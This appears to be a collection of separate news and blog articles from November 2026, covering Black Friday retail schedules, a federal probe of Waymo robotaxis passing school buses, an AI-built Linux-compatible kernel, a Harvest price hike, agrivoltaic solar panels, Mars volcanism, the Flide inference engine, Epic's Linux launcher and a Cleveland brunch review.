Amazon has yet to announce its full Black Friday playbook, but the online retailer has dropped a few early deals in its so-called Holiday Shop, including steep discounts on Sony’s WH-1000XM6 headphones, the Google Pixel 11 Pro XL, and fitness trackers like the Fitbit Inspire 3. Just be aware that Amazon does not offer price matching, so price “protection” for many Amazon shoppers means buying the item at the lower price point and returning the original — which, unfortunately, is pretty wasteful.
Like in previous years, Walmart plans to roll out its Black Friday deals in three distinct waves. The first runs from November 12th through November 15th, starting online at 12:01AM ET and in stores at 6AM local time. Walmart Plus members will also get early access to some deals beginning at 12:01AM ET on November 12th, with the sale opening up to everyone at 12:01AM ET on November 13th.
Walmart’s official Black Friday sale then kicks off at 12:01AM on Monday, November 23rd, with Walmart Plus members once again getting early access to select deals online. Whatever “hot Deal drops” remain will then be available to non-members at 12:01AM ET on November 24th.
Walmart’s in-store Black Friday sale will then kick off at 6AM local time on November 27th. The retailer’s Cyber Monday sale, meanwhile, will kick off online at 12:01AM ET on November 30th and run through December 2nd.
The retailer hasn’t shared many deal specifics yet, but did offer a sneak peek in a recent press release promising discounts across a range of categories, including toys, fashion, beauty, and home goods.
Best Buy officially kicked off its Black Friday promos on October 30th, with the retailer launching its first set of doorbuster deals on Halloween. Like last year, Best Buy will drop subsequent deals every Friday in the run-up to the holidays, and those who sign up for My Best Buy Plus or My Best Buy Total will also get up to $25 in bonus rewards during select doorbuster events.
As for Best Buy’s main Black Friday event, the promos are slated to begin on November 19th and run for 10 days. The retailer will then hold its Cyber Sunday and Cyber Monday sale, followed by another round of Cyber Week deals, which will run from December 1st through the 6th. Best Buy also plans to hold a Last-Minute Savings event from December 18th through the 24th, giving shoppers yet another opportunity to save on holiday gifts.
Additionally, Best Buy shoppers get holiday price protection, which means that if you purchase a qualifying item and its price drops at Best Buy during the eligible holiday period, you can request a refund for the difference. The retailer is also extending its holiday return window, allowing most purchases made between October 30th and December 31st to be returned through January 15th, 2027, or January 31st for My Best Buy Plus and Total members.
Target’s early Black Friday sale ran from November 5th through November 7th, but the retailer also announced that it will introduce new limited-time deals every weekend throughout the holiday season. In addition, Target has brought back its “Deal of the Day” promotion, offering a new deal every day from November 1st through December 24th, with a one-day preview of upcoming offers.
GameStop has yet to announce its full Black Friday 2026 sale lineup, including specific discounts on games, consoles, and accessories. In prior years, the retailer has opened as early as 7AM local time on Black Friday, though the exact hours may vary by location. We’ll update this post as more details become available.
Newegg is kicking off the holiday shopping season with its Black November event, offering a new round of doorbuster deals every day from November 1st through November 30th. New discounts drop daily at 12PM ET, with deals available in limited quantities while supplies last. Shoppers can also preview the following day’s offers starting at 12PM ET.
Costco has already kicked off its Black Friday sale, with deals rolling out in two waves: October 30th through November 15th and November 16th through the 30th. The wholesale retailer will also offer online deals on Thanksgiving Day (Costco stores will be closed on the holiday itself), followed by a larger Black Friday sale, which runs from November 27th through the 30th. A separate, online-only Cyber Monday event will take place on November 30th.
Update, November 9th: Added new details for Walmart, Best Buy, and other retailers for the 2026 shopping season.

articles.title: Waymo robotaxis kept illegally passing school buses after software fix, feds say
articles.body:
Nearly a year ago, Waymo updated its self-driving software and issued a recall after numerous reports that its robotaxis were illegally passing school buses that had stopped and deployed flashing red lights. Now, federal safety regulators have opened a new investigation into why that behavior has continued.
The National Highway Traffic Safety Administration (NHTSA) said in a November 6 filing that a majority of these reported incidents occurred after the company deployed a software update intended to fix the problem.
Reuters was the first to report the filing.
Waymo said last year that a software update was completed for all affected vehicles on November 17, 2025. However, NHTSA said the majority of the incidents occurred after the software update. NHTSA’s Office of Defects Investigation (ODI) has opened a “recall query” to “assess the adequacy of the remedy.”
The ODI opened its initial investigation into Waymo in October 2025 after seeing footage of one of its autonomous vehicles maneuvering around a stopped school bus that had its stop sign extended, lights flashing, and was unloading children in Atlanta. In that incident, a Waymo robotaxi crossed perpendicularly in front of the school bus from its right side. The autonomous vehicle then turned left around the front of the bus before traveling down the street.
Numerous other incidents have been documented in the weeks and months since in Austin, where Waymo also operates a robotaxi service. Austin Independent School District officials reported at least five such incidents at the time, according to a letter filed with NHTSA.
Reached for comment, Waymo stressed the importance of safety to its mission. “We have made significant improvements to vehicle behavior around school buses and have received no citations since March 2026,” a spokesperson told TechCrunch via email. “The Waymo Driver has a clearly demonstrated positive impact on roadway safety. Once received, we’ll work to respond to NHTSA’s query and look forward to continuing our engagement on recall processes for AV software that continues to learn and improve.”
TechCrunch also reached out to Austin Independent School District officials for comment and will update the article if they respond.
This article was updated after publication with Waymo’s statement.

Ginux: A New Kernel Runs Linux Userspace, Made via Human-Directed AI Engineering
articles.body:
Ginux: Building an Independent Kernel That Runs Linux Userspace through Human-Directed Agentic Engineering
Description
This report presents Human-Directed Agentic Engineering (HDAE), a method for building complex software by combining human-defined architecture, constraints, milestones, acceptance criteria, and stopping points with an autonomous implementation, execution, diagnosis, and revision loop. The experiment examines what this development model can accomplish and the domain expertise and executable validation required to keep it aligned
Ginux serves as the experimental case study. Over eleven days, one persistent coding-agent task produced an independent Rust-first x86-64 kernel that boots through UEFI, implements its own core operating-system mechanisms and Linux compatibility layer, executes selected unmodified Alpine Linux programs, and boots a Rocky Linux 10 userspace with systemd through multi-user.target.
Ginux demonstrates the rapid integration of established systems mechanisms, but it remains a research prototype. Its compatibility and hardware coverage are narrow, it has not received an independent security audit, and it makes no claim to production readiness or equivalence with Linux.

articles.title: RIP, Harvest
articles.body:
I’ve been a self-employed contractor for about a decade now, and I’m bummed about Harvest.
Harvest was a time-tracking and invoicing service. You’d track how many hours or weeks you spent on a project, put together an invoice, email it to the client, and close it out when they paid. There was a little Stripe integration for accepting credit and ACH payments on the invoice web view. A historical chart of total billed/paid amounts over time, and a table of invoices. Harvest was exactly what you want from small-business software: it solved a well-defined problem with a reliable, simple interface, and did so at a reasonable monthly price. They managed to avoid scope creep and never tried to become an accounting platform, or a blockchain for washing machines.1 I loved Harvest and raved about it to every self-employed person I met.
Back in 2025 Harvest got bought out by Bending Spoons, the company that gutted Vimeo. I was worried they might ruin it, but was busy with other things and didn’t have time to look for new invoicing software.
Long story short, they raised my price from $13.32 to $133.98 per month by moving everyone to a new “enterprise” plan and “unlimited” usage billing model, which is, as far as I can tell, exactly what I had before. There’s also a “flex” plan which costs $12.65 per month… but that plan now skims an additional 2% on top of the usual ~3% card transaction fees. To be clear, that 3% pays for the whole credit card network, plus all the people working at Stripe and Mastercard, plus the financial risk of chargebacks and fraud, etc. Harvest isn’t doing any of that work. I don’t know about you, but I don’t think I need to spend 2% of my gross revenue to send a couple PDFs a month and wrap a Stripe web form.
I wrote to Harvest about this, and discovered that they don’t read customer emails any more. Instead they have a Large Language Model repeatedly vomit thousands of words at you. I’m no stranger to enshittification, but man, I did not anticipate the speed at which Bending Spoons would drive a perfectly good company into the ground.
Time to find a new invoicing service, I guess. Maybe bookkeeping too—Intuit’s Quickbooks Online seems to have completely jumped the shark. Any of y’all freelancers have a system you like?
- Yes, someone actually tried this. ↩

articles.title: Magenta solar panels may be agrivoltaics' cleverest trick yet
articles.body:
Vegetable farms and solar farms both need lots of sunlight and open space. But how do we divide our limited lands between these two priorities? One elegant solution is to put crops and solar panels on the same land—and share the broad spectrum of incoming sunlight between them.
A new study in Cell Reports Physical Science does this with photovoltaic cells that are semi-transparent: They capture some wavelengths of sunlight to make electricity, while letting the wavelengths most critical to photosynthesis pass through and reach the plants below. The new study suggests that broccoli can be grown in the magenta shade of these solar panels—without sacrificing the harvest.
Agrivoltaic schemes—putting plants and solar on the same land – could help us avoid clearing more land for human use. Climate studies suggest that this might work especially well across a wide sunbathed swath of the United States, from Texas up to Nebraska and west to California. Devoting just one percent of U.S. farmland to agrivoltaics could cover up to 20 percent of the nation’s electricity needs.
But traditional photovoltaic panels are opaque—and by shading plants, they can reduce crop yields. So engineers are trying to create new photovoltaic cells that divide the spectrum of sunlight between plants and electricity generation—similar to how governments segment different frequency bands for television, radio, cell phones, and other uses.
A 2020 study looked at panels that allow red wavelengths, critical for photosynthesis, to pass through—while harvesting green and blue wavelengths to make electricity. Basil grown under these panels produced similar yields, while spinach yields decreased. But the researchers estimated that by selling both electricity and crops, farmers growing spinach could generate 35 percent more income from the same land.
In the newest study, scientists evaluated a different kind of semi-transparent panel that lets most red and some blue wavelengths pass through—casting a magenta light on the plants—while converting much of the rest to electricity.
Broccoli cultivated under them grew more slowly, requiring an additional 25 days for harvest, but produced roughly the same yield. Meanwhile, these magenta sunscreens improved the microclimate below, reducing the “vapor pressure deficit”—a measure of when plants need to halt photosynthesis to avoid excessive water loss. This may have improved the plants’ efficiency in converting sunlight into plant biomass, which increased by 2.8- to 4.5-fold compared to unshaded plants.
The shaded plants’ levels of macronutrients such as calcium, magnesium, and phosphorus were either higher than or similar to unshaded plants, while levels of some micronutrients such as iron, copper, and zinc were slightly lower.
This was only a preliminary study. Future studies should look at larger plots, farmed across multiple seasons, and in different locations with varying climate and sunlight. It suggests that for now, the future of agrivoltaics might be best seen through rose-colored glasses.
Lu et al. “Evaluating land productivity with semi-transparent colored CdTe thin-film PV and broccoli cultivation in agrivoltaic systems.” Cell Reports Physical Science, 2026.
Image: Broccoli growing beneath semi-transparent, colored solar panels at the experimental site at Kärrbo Prästgård farm in Sweden. ©Silvia Ma Lu

articles.title: Jensen Huang pulls out of ElevenLabs Summit amid Nvidia controversy
articles.body:
Nvidia CEO Jensen Huang has pulled out of the ElevenLabs Summit scheduled for this Wednesday in New York, ElevenLabs, the voice AI company, confirmed Monday. He has also dropped out of other speaking engagements, including the Anthropic CEO Forum. Nvidia is an investor in ElevenLabs.
The withdrawals come after Huang admitted to an extramarital affair over the weekend, and Nvidia opened an investigation into his relationship with a possible Chinese spy.
“I owe my family and all of you an apology. I was unfaithful to my wife. My actions hurt her and our children. There is no excuse for what I did. I am deeply sorry,” Huang said in a memo to the company.
The incident has rattled the AI industry, raising questions about Huang’s staying power as CEO and Nvidia’s own China ambitions.

articles.title: Orbiter Detects Signs of Possible Volcanic Activity on Mars
articles.body:
Orbiter Detects Signs of Possible Volcanic Activity on Mars (futurism.com) 8
			
		 	
				Futurism reports:
While many scientists have long held that Mars is "geologically dead" inside, new research is adding to the growing body of evidence to the contrary.
As detailed in a new paper published in the journal Science Advances, an international team of researchers examined data collected by the European and Russian ExoMars Trace Gas Orbiter in 2021, which found that Mars is slowly belching hydrogen chloride gas. The researchers suggest this gas is being released from hot magma deep beneath its surface after discovering intriguing new fissures along a massive volcano, indicating the planet may be geologically active after all — or at least it was until relatively recently.
The research could have significant implications for the possibility of ancient life on the Red Planet, hinting at a far warmer and thicker atmosphere — and an abundance of liquid water on its surface — in its not-too-distant past.... The team discovered new fissures measuring thousands of feet in length... suggesting ongoing activity underneath the surface. The researchers discovered discolorations along these fissures, concluding that they may be the result of seeping gases leaving mineral deposits similar to volcanic gas vents on Earth... The fissures could also be a perfect place to find evidence of past life on the Red Planet [argued Daniel Mège, the study's colead author and a Polish Academy of Sciences professor]...    "If hydrothermal systems are active, they could contain the ingredients and energy needed for microorganisms to develop, and shield microorganisms from the hostile and changing environment above the surface."

articles.title: Show HN: Flide: Make Jev-like decision models up to 9.5x faster
articles.body:
News · Quick start · Models · Options
Flide is fast inference infrastructure for Jev-style decision models. With exact state forking it is up to 9.5 times faster than vLLM and SGLang, and every answer is the one the model gives the question alone. It serves the Jev /v1/systemone API.
- 🔥 2026-11-10 We added an email triage demo in Flide 0.1.11, where Flide tags 10,000 emails with eight questions each in 28 seconds on one H200.
- 🔥 2026-11-09 We added Ainvest-Decision, Darwin-27B-RSI-Decision and KnowLine-31B-Gen1.5 in Flide 0.1.10, and the KnowLine family now reads images.
- 🔥 2026-11-09 We added pplx-decider-v1.1-27b and JEV-35B in Flide 0.1.9, and /v1/systemone now takes several requests in one body.
Earlier news
- 🔥 2026-11-08 We added two decision model families in Flide 0.1.8, including AutoTrust and Clef, and also drex-max-v1.
- 🔥 2026-11-02 We released our paper Flide: Accelerating Decision Inference with Exact State Forking on arXiv.
- 🔥 2026-10-29 We added three decision model families in Flide 0.1.7, including SynACK Decide, Wald and Xor, and Gemma 4 mixture-of-experts models such as KnowLine-26B-A4B.
- 🔥 2026-10-29 We added two decision model families in Flide 0.1.6, including Drex and KnowLine, and flide verify checks exact forking on your own model and requests.
- 🔥 2026-10-28 We added six decision model families in Flide 0.1.5, including Jeffan, JevAny, Kev, Lychee, pplx-decider and StartLux, and images for Lumma and mammoth.
- 🔥 2026-10-26 We added five decision model families in Flide 0.1.4, including cerno, JADE, Linne, mammoth and Sieve, and also Quyet-1.0-Large.
- 🔥 2026-10-26 We added eight decision model families in Flide 0.1.3, including AJev, Bespoke-Nimble, Darwin, jiwo, Lumma, mogan, Quyet and Senova, and LoRA adapters now serve as they are.
- 🔥 2026-10-25 We added two decision model families in Flide 0.1.2, including Intern-Decision and torchcast, and a question now takes up to 256 options.
- 🔥 2026-10-24 We released Flide 0.1.0 on PyPI, serving Qwen3.5 and Gemma 4 chat models and the OneJev and Open-Jev decision models. Welcome to have a try.
See the docs for every model, images, the API and all options.
uv venv -p 3.12 && source .venv/bin/activate
uv pip install flide torchvision
flide serve --model OmniJev/OneJev1.6-0.8B
Any model in the model table starts the same way, for example Perplexity's decision model.
flide serve --model perplexity-ai/pplx-decider-flash-v1.2
Every one of them answers this request.
curl http://localhost:8000/v1/systemone -H "Content-Type: application/json" -d '{
  "state": "Order #1182 arrived with a cracked screen. The customer asks for a refund and attached two photos.",
  "questions": {
    "action": {"type": "choice", "instructions": "What should support do next?",
               "criteria": {"refund": "refund the order", "replace": "send a replacement", "escalate": "ask a human"}},
    "urgent": {"type": "noul", "instructions": "Does this need a reply within the hour?"}
  }
}'
Flide answers eight questions for each of 10,000 emails in only 28 s. The email triage demo has the code to run it yourself.
On one H200 with OneJev1.6-0.8B, Flide answers one email in 10.0 ms and all 10,000 in 28 seconds, 3.5 times as fast as the fastest other engine for one email and 4.1 times for all of them.
The last three columns say how much faster Flide answers one request than the engine its release ships, as the median latency over the requests of each workload on one H200, where DI is the Decision Index. The chat models run against the faster of vLLM and SGLang, and OneJev against qev, the engine it used before Flide. KnowLine 35B runs with --quantize fp8, as its release serves it in FP8. A value marked ~ is the average over the sizes tested.
Apache-2.0. flide/kernels/gdn.py holds a kernel derived from two kernels of
flash-linear-attention (MIT); THIRD_PARTY_NOTICES lists it with
the other code Flide builds on.
If you use Flide in your research, please cite our paper.

  title   = {Flide: Accelerating Decision Inference with Exact State Forking},
  author  = {Li, Bobo and Song, Jiajia and Fei, Hao and Hsu, Wynne and Lee, Mong Li},
  journal = {arXiv preprint arXiv:2610.42148},
  year    = {2026}
}

articles.title: Epic Games Comments On Planned Linux Distribution Support
articles.body:
Epic Games Comments On Planned Linux Distribution Support (gamingonlinux.com) 10
			
		 	
				Epic Games says it plans to support its new Linux launcher on as many distributions as possible, specifically naming Fedora, SteamOS, CachyOS and Omarchy. GamingOnLinux's Liam Squires-Hand reports:  Speaking to Jake Jones, Communications Director at Epic Games, they said: "Hey Liam! The new Epic Games Launcher is still in Preview and we plan to support as many Linux distributions as possible, including Fedora, SteamOS, Cachy, Omarchy, and more. We're testing and evaluating packaging formats for distribution, and we'll restore AppImage this month."
With that in mind, until things settle down, you might see different packaging types appear or disappear until they decide firmly how they plan to support different distributions each with their own different packaging formats. Or, perhaps they might see the Flatpak light and just put it up officially on Flathub. Would make it even easier for SteamOS then too with Flathub, since it would just be a quick pop to Desktop Mode to install it directly in the Discover app.

articles.title: Brunching It Up At Cordelia
articles.body:
Brunching It Up At Cordelia
Posted on November 9, 2026 Posted by Athena Scalzi 3 Comments
My favorite meal that one can have is undoubtedly brunch. There’s breakfasty dishes, sweet pastries, savory meals, green juice and espresso martinis, it’s really a wild ride with many paths to choose.
The first morning after Lily flew in to Cleveland, our brunch path began at Cordelia. Named in honor of the owner’s great-grandmother, Cordelia’s resides on East 4th, which is closed off to traffic so pedestrians can stroll their way through a scenic cluster of restaurants and bars.
(There was some construction going on as you can tell by the chain link fence, but fear not, for Cordelia’s sign will point you in the right direction.)
With a James Beard finalist chef, Cordelia focuses on seasonally curated dishes in partnership with local farmers, really honing in on a “harvest’s bounty” vibe. They refer to their menu as “modern grandma,” which I actually love.
I had made us reservations for 12:30, so getting a table was no problem, though they definitely were pretty packed since it was Sunday morning. The space was very open and inviting, with high ceilings, tons of eclectic framed photos covering one wall, original terrazzo flooring, and a long, beautiful bar with striking blue bar stools that match their blue velvet booths.
We walked to Cordelia since it was literally right across the street and that area is meant for pedestrians anyways, but I did learn that they have a $14 validate valet parking option which is nice.
The hostess and waitress were both extremely friendly and chatted with us beyond the usual pleasantries, which was very cool and made for a really genuine interaction.
Before taking a look at the food, we had to start off with some bevvies. Lily went with their Bloody Mary, and I opted for an espresso martini:
The lime is blocking it, but there’s a toothpick of giardiniera-style vegetables and an olive on top of the Bloody Mary. Plus, of course, three beans on my espresso martini. Any espresso martini enjoyer knows you have to have those three beans. Lily’s drink was definitely a bit spicy for me, and also quite strong! Talk about a wake-up call. My drink was one of the best espresso martinis I’ve ever had, and I usually don’t get two in a row but I ordered a second one. It was very balanced, not too sweet or bitter at all. Good foam. A+ on the drinks round.
Here’s their Sunday Brunch menu:
So much of this menu is vegetarian, and there’s a couple gluten-free options, too!
Though everything sounded seriously delish, Lily and I knew we had to have some oysters, so we got two for $9 and got them “new school” style, which meant it came with a mignonette.
These oysters were incredibly fresh and the mignonette was packed with flavor. These were great starters to whet our appetite.
Next, we had these jammy eggs with ajvar and furikake. I didn’t know what ajvar was, but apparently it’s like a condiment or spread made from peppers and vegetables.
As you can see, they loaded these bad boys up with the ajvar, and the addition of fresh dill was a pleasant surprise, as it’s one of my favorite herbs. The eggs were so perfectly jammy, and the ajvar had some heat but not too much. Needless to say we tore this dish up.
We also ordered the carrot muhammara with hazelnut dukkah. Once again, I found myself not knowing what these words meant, but thankfully our server was very patient with our many questions. Muhammara is basically just hummus but with red peppers and I guess in this case, carrots! As for the dukkah, it’s like a seasoning mix made with nuts and spices. I felt like I was learning so much!
Okay so picture something really bland. Now imagine the complete opposite of that, and you’ll have this. Flavorful is an understatement. This dish was like a rich, umami bomb, and had the most amazing texture when spread over the sourdough slices. This was such a good choice.
We also opted to share the “Sunday On A Shingle,” which was sausage focaccia with sunny-side up eggs on top:
After two drinks each and sharing two appetizers, we found ourselves so stuffed we literally couldn’t even eat this entree. I figured, no problem, we can just have it later on since we have a mini fridge in the room. That is, until, I left the box in my car all day. So, Lily and I did not even have a single bite of this dang entree, and I’m all the sadder for it, because look how good those sunny eggs look! Perfection, wasted. And $18 wasted but not tasting it is even more of a tragedy.
Even though we only tried oysters, jammy eggs, carrot muhammara, and two cocktails, Cordelia was such a pleasant experience that I want to go back ASAP! It’s original, it’s fresh, it’s intentional, it’s cool. I really like it.
Cordelia is also cool because they are all about community, and have a page on their site dedicated to recommending other restaurants and bars, things to do, and even lists all their culinary partners. Quite thorough, honestly.
Plus, they have a mission to make the hospitality industry better, and they show it by making sure their entire team has plenty of benefits like healthcare (including mental health), 401k with a 4% employer match, PTO with bereavement and paid sick time, discounted spa services (found this one very interesting), and more. They also contribute to over a dozen charities.
Good food, good people, and a good mission. Check them out if you can, even if it’s just for one drink I’m sure you won’t be disappointed. And if you feel so inclined, follow them on Instagram!
